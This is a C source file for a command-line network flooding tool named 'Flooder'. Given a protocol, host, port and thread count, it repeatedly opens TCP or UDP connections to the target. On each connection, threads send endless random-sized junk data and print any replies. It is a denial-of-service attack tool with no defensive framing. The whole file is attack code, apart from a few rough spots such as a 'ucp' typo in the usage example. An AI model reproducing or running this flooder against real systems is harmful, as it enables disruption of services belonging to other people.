#include <sys/types.h>          /* See NOTES */
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include<stdio.h>
#include<pthread.h>
#include<time.h>
#include"main.h"

void ReaddEr(int socket)
{
char * buffer = (char*)malloc(sizeof(char)*SIZEBUFFER);
while(readFrom(socket,buffer))
 printf("Recv: %s\n",buffer);
}

void FlooDer(int socket)
{
srand(time(NULL));
char * buffer = (char*)malloc(sizeof(char)*SIZEBUFFER);
randString(buffer, rand() % SIZEBUFFER);
while( writeTo(socket,buffer) )
 randString(buffer, rand() % SIZEBUFFER);
close(socket);
}

void main(int argc,char**argd)
{
if(argc < 5) error("./programm tcp/udp host port threads\nExample: ./Flooder ucp localhost 6666 5\n");
int Protocol = strcmp(argd[1], "udp") == 0 ? 1 : 0; 
while(1)
{
register int CSOCKET;
static pthread_t Threads;
for(int T = atoi(argd[4]);T--;)
{
 CSOCKET = initSocket(Protocol,argd[2],atoi(argd[3]));
 pthread_create(&Threads,NULL,ReaddEr,CSOCKET);
 pthread_create(&Threads,NULL,FlooDer,CSOCKET);
}
pthread_join(Threads,NULL);
close(CSOCKET);
}

}
